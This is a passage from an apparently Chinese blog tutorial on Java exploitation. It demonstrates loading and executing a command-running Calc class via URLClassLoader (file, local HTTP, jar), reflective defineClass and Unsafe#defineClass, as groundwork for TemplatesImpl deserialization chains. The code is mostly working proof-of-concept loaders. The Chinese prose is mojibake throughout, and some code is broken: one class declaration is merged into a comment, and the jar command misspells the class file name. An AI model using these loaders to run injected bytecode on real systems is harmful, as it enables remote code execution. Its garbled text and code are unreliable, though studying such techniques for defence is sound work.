ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ <code>java.net.URL</code> ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š</p><p>â‘ ï¼šURLæœªä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ <code>JarLoader</code> æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶</p><p>â‘¡ï¼šURLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ <code>file</code> ï¼Œåˆ™ä½¿ç”¨ <code>FileLoader</code> æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶</p><p>â‘¢ï¼šURLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ <code>file</code> ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ <code>Loader</code> æ¥å¯»æ‰¾ç±»ã€‚</p><p>æˆ‘ä»¬ä¸€ä¸ªä¸ªçœ‹</p><h4 id="file-åè®®"><a href="#file-åè®®" class="headerlink" title="file åè®®"></a>file åè®®</h4><p>æˆ‘ä»¬åœ¨ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª Calc.java çš„æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// URLClassLoader çš„ file åè®®  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;  <br>    <span class="hljs-keyword">static</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨ç»ˆç«¯è¿›è¡Œç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac Calc.java<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å½“å‰ç›®å½•ä¸‹ç”ŸæˆCalc.classæ–‡ä»¶</p><p>æ¥ç€ï¼Œæˆ‘ä»¬ç¼–å†™ URLClassLoader çš„å¯åŠ¨ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-comment">// URLClassLoader çš„ file åè®®</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span><br>                (<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///D:\\javaEEç»ƒä¹ \\src\\src\\main\\java\\src&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a36.png"></p><h4 id="HTTP-åè®®"><a href="#HTTP-åè®®" class="headerlink" title="HTTP åè®®"></a>HTTP åè®®</h4><p>åœ¨ <code>Calc.class</code> æ–‡ä»¶ç›®å½•ä¸‹æ‰§è¡Œ <code>python3 -m http.server 9999</code>ï¼Œèµ·ä¸€ä¸ª http æœåŠ¡ã€‚</p><p>æ¥ç€ï¼Œæˆ‘ä»¬ç¼–å†™æ¶æ„åˆ©ç”¨ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-comment">// URLClassLoader çš„ HTTP åè®®</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a37.png"></p><h4 id="file-jar-åè®®"><a href="#file-jar-åè®®" class="headerlink" title="file+jar åè®®"></a>file+jar åè®®</h4><p>å…ˆå°†æˆ‘ä»¬ä¹‹å‰çš„ class æ–‡ä»¶æ‰“åŒ…ä¸€ä¸‹ï¼Œæ‰“åŒ…ä¸º jar æ–‡ä»¶ã€‚</p><p>å»åˆ°æº .class æ–‡ä»¶ä¸‹ï¼Œåˆ«å»å¤åˆ¶çš„åœ°æ–¹ï¼Œè¿è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar -cvf Calc.jar Clac.class<br></code></pre></td></tr></table></figure><p>æ¥ç€ï¼Œæˆ‘ä»¬ä¿®æ”¹å¯åŠ¨å™¨ï¼Œè°ƒç”¨æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.Calc&quot;</span>);<br>        calc.newInstance();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a38.png"></p><h4 id="HTTP-jar-åè®®"><a href="#HTTP-jar-åè®®" class="headerlink" title="HTTP + jar åè®®"></a>HTTP + jar åè®®</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;  <br>  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.net.URLClassLoader;  <br>  <br><span class="hljs-comment">// URLClassLoader çš„ HTTP + jarpublic class HTTPJarRce &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;</span>)&#125;);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.Calc&quot;</span>);  <br> calc.newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a39.png"></p><p>æœ€çµæ´»çš„è‚¯å®šæ˜¯ http åè®®çš„åŠ è½½</p><h3 id="åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </h3><p>ä¸ç®¡æ˜¯åŠ è½½è¿œç¨‹ class æ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„ class æˆ– jar æ–‡ä»¶ï¼ŒJava éƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">URLClassLoader.loadClass()<br>    â†“<br>findClass()<br>    â†“<br>URLClassPath -&gt; æ‰“å¼€ URLï¼ˆfile/http/ftpï¼‰<br>    â†“<br>è¯»å–å­—èŠ‚ç <br>    â†“<br>ClassLoader.defineClass() (native)<br>    â†“<br>å¾—åˆ° JVM å†…éƒ¨ Class å¯¹è±¡<br></code></pre></td></tr></table></figure><p>ä»å‰é¢çš„åˆ†æå¯çŸ¥ï¼š</p><ul><li><code>loadClass()</code> çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ã€çˆ¶åŠ è½½å™¨ä½ç½®å¯»æ‰¾ç±»ï¼ˆå³åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨å½“å‰ClassLoaderçš„<code>findClass()</code>æ–¹æ³•ï¼›</li><li><code>findClass()</code> æ ¹æ®URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå…¶ä¸­ä¼šè°ƒç”¨<code>defineClass()</code>ï¼›</li><li><code>defineClass</code> çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„ Java ç±»<br>æ‰€ä»¥å¯è§ï¼ŒçœŸæ­£æ ¸å¿ƒçš„éƒ¨åˆ†å…¶å®æ˜¯ defineClass ï¼Œä»–å†³å®šäº†å¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJava</li></ul><p>é»˜è®¤çš„ <code>ClassLoader#defineClass</code> æ˜¯ä¸€ä¸ª native æ–¹æ³•ï¼Œé€»è¾‘åœ¨ JVM çš„Cè¯­è¨€ä»£ç ä¸­ã€‚</p><p> <code>DefineClass</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)<br>       <span class="hljs-keyword">throws</span> ClassFormatError<br>   &#123;<br>       <span class="hljs-keyword">return</span> defineClass(name, b, off, len, <span class="hljs-literal">null</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p><code>name</code>ä¸ºç±»åï¼Œ<code>b</code>ä¸ºå­—èŠ‚ç æ•°ç»„ï¼Œ<code>off</code>ä¸ºåç§»é‡ï¼Œ<code>len</code>ä¸ºå­—èŠ‚ç æ•°ç»„çš„é•¿åº¦ã€‚</p><p>å› ä¸ºç³»ç»Ÿçš„ ClassLoader#defineClass æ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ã€‚å› æ­¤å¯ä»¥åå°„è°ƒç”¨ <code>defineClass()</code> æ–¹æ³•è¿›è¡Œå­—èŠ‚ç çš„åŠ è½½ï¼Œç„¶åå®ä¾‹åŒ–ä¹‹åå³å¯å¼¹ shell</p><p>æˆ‘ä»¬ç¼–å†™å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-comment">// åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClassRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Calc.class&quot;</span>)); <span class="hljs-comment">// å­—èŠ‚ç çš„æ•°ç»„</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (Class) method.invoke(classLoader, <span class="hljs-string">&quot;src.Calc&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p>ä½¿ç”¨<code>ClassLoader#defineClass</code>ç›´æ¥åŠ è½½å­—èŠ‚ç æœ‰ä¸ªä¼˜ç‚¹å°±æ˜¯ä¸éœ€è¦å‡ºç½‘ä¹Ÿå¯ä»¥åŠ è½½å­—èŠ‚ç ï¼Œä½†æ˜¯å®ƒä¹Ÿæ˜¯æœ‰ç¼ºç‚¹çš„ï¼Œå°±æ˜¯éœ€è¦è®¾ç½®<code>m.setAccessible(true);</code>ï¼Œè¿™åœ¨å¹³å¸¸çš„åå°„ä¸­æ˜¯æ— æ³•è°ƒç”¨çš„ã€‚</p><p>åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸º <code>defineClass</code> æ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾ <code>TemplatesImpl</code> çš„åŸºçŸ³ã€‚</p><h3 id="Unsafe-åŠ è½½å­—èŠ‚ç "><a href="#Unsafe-åŠ è½½å­—èŠ‚ç " class="headerlink" title="Unsafe åŠ è½½å­—èŠ‚ç "></a>Unsafe åŠ è½½å­—èŠ‚ç </h3><ul><li>Unsafeä¸­ä¹Ÿå­˜åœ¨<code>defineClass()</code>æ–¹æ³•ï¼Œæœ¬è´¨ä¸Šä¹Ÿæ˜¯ <code>defineClass</code> åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ã€‚</li></ul><p> <code>Unsafe</code> çš„ <code>defineClass()</code> æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClass(<br>    String name,        <span class="hljs-comment">// ç±»çš„å…¨é™å®šå (åŒ…å.ç±»å)ï¼Œå¯ä»¥ä¸º null</span><br>    <span class="hljs-type">byte</span>[] b,           <span class="hljs-comment">// å­—èŠ‚ç æ•°ç»„ï¼ˆclass æ–‡ä»¶çš„äºŒè¿›åˆ¶å†…å®¹ï¼‰</span><br>    <span class="hljs-type">int</span> off,            <span class="hljs-comment">// ä»å­—èŠ‚æ•°ç»„çš„å“ªä¸ªä½ç½®å¼€å§‹è§£æ</span><br>    <span class="hljs-type">int</span> len,            <span class="hljs-comment">// è¦è§£æçš„å­—èŠ‚é•¿åº¦</span><br>    ClassLoader loader, <span class="hljs-comment">// ç”±å“ªä¸ªç±»åŠ è½½å™¨å»åŠ è½½</span><br>    ProtectionDomain pd <span class="hljs-comment">// å®‰å…¨åŸŸï¼ˆæ§åˆ¶æƒé™ï¼‰</span><br>);<br></code></pre></td></tr></table></figure><p>åŒæ—¶å¯ä»¥åœ¨Unsafeç±»ä¸­çœ‹åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Unsafe theUnsafe;<br><br>theUnsafe = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Unsafe</span>();<br><br><span class="hljs-keyword">private</span> <span class="hljs-title function_">Unsafe</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ¤æ–­Unsafeç±»æ˜¯ä¸€ä¸ªå•ä¾‹æ¨¡å¼ï¼Œæˆ‘ä»¬åˆ©ç”¨åå°„è°ƒç”¨defineClassæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.UnsafeClassLoader;  <span class="hljs-comment">// åŒ…è·¯å¾„ï¼šåŠ¨æ€ç±»åŠ è½½å™¨/éå®‰å…¨ç±»åŠ è½½å™¨</span><br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;  <span class="hljs-comment">// å¯¼å…¥Sunå†…éƒ¨APIï¼ˆéæ ‡å‡†ï¼‰</span><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeClassLoaderRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1. è·å–ç³»ç»Ÿç±»åŠ è½½å™¨</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <br>        <span class="hljs-comment">// 2. è·å–Unsafeç±»çš„Classå¯¹è±¡</span><br>        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;<br>        <br>        <span class="hljs-comment">// 3. é€šè¿‡åå°„è·å–Unsafeç±»çš„ç§æœ‰å­—æ®µ&quot;theUnsafe&quot;</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        <br>        <span class="hljs-comment">// 4. è§£é™¤ç§æœ‰å­—æ®µçš„è®¿é—®é™åˆ¶</span><br>        unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <br>        <span class="hljs-comment">// 5. è·å–Unsafeå•ä¾‹å®ä¾‹ï¼ˆé™æ€å­—æ®µï¼Œæ‰€ä»¥ä¼ nullï¼‰</span><br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">classUnsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br>        <br>        <span class="hljs-comment">// 6. è·å–defineClassæ–¹æ³•ï¼ˆUnsafeçš„å…³é”®æ–¹æ³•ï¼‰</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> unsafeClass.getMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <br>            String.class,         <span class="hljs-comment">// ç±»å</span><br>            <span class="hljs-type">byte</span>[].class,        <span class="hljs-comment">// ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">int</span>.class,           <span class="hljs-comment">// åç§»é‡</span><br>            <span class="hljs-type">int</span>.class,           <span class="hljs-comment">// é•¿åº¦</span><br>            ClassLoader.class,   <span class="hljs-comment">// ç±»åŠ è½½å™¨</span><br>            ProtectionDomain.class <span class="hljs-comment">// ä¿æŠ¤åŸŸ</span><br>        );<br>        <br>        <span class="hljs-comment">// 7. ä»æ–‡ä»¶ç³»ç»Ÿè¯»å–æ¶æ„ç±»çš„å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Calc.class&quot;</span>));<br>        <br>        <span class="hljs-comment">// 8. ä½¿ç”¨Unsafeå¼ºè¡Œå®šä¹‰ç±»ï¼ˆç»•è¿‡æ‰€æœ‰å®‰å…¨æ£€æŸ¥ï¼‰</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <br>            <span class="hljs-string">&quot;src.Calc&quot;</span>,  <span class="hljs-comment">// ç±»å</span><br>            code,        <span class="hljs-comment">// å­—èŠ‚ç </span><br>            <span class="hljs-number">0</span>,           <span class="hljs-comment">// åç§»é‡</span><br>            code.length, <span class="hljs-comment">// é•¿åº¦</span><br>            classLoader, <span class="hljs-comment">// ç±»åŠ è½½å™¨</span><br>            <span class="hljs-literal">null</span>         <span class="hljs-comment">// ä¿æŠ¤åŸŸï¼ˆæ— é™åˆ¶ï¼‰</span><br>        );<br>        <br>        <span class="hljs-comment">// 9. åˆ›å»ºå®ä¾‹å¹¶æ‰§è¡Œï¼ˆå®ç°RCE-è¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</span><br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><h3 id="TemplatesImpl-åŠ è½½å­—èŠ‚ç "><a href="#TemplatesImpl-åŠ è½½å­—èŠ‚ç " class="headerlink" title="TemplatesImpl åŠ è½½å­—èŠ‚ç "></a>TemplatesImpl åŠ è½½å­—èŠ‚ç </h3><ul><li>æˆ‘ä»¬å…ˆè·Ÿè¿› TemplatesImpl è¿™ä¸ªåŒ…ä¸­çœ‹ TemplatesImpl çš„ç»“æ„å›¾</li></ul><p>å¯ä»¥çœ‹åˆ°åœ¨ <code>TemplatesImpl</code> ç±»ä¸­è¿˜æœ‰ä¸€ä¸ªå†…éƒ¨ç±» <code>TransletClassLoader</code>ï¼Œè¿™ä¸ªç±»æ˜¯ç»§æ‰¿ <code>ClassLoader</code>ï¼Œå¹¶ä¸”é‡å†™äº† <code>defineClass</code> æ–¹æ³•ã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a40.png"></p><ul><li>ç®€å•æ¥è¯´ï¼Œè¿™é‡Œçš„ <code>defineClass</code> ç”±å…¶çˆ¶ç±»çš„ protected 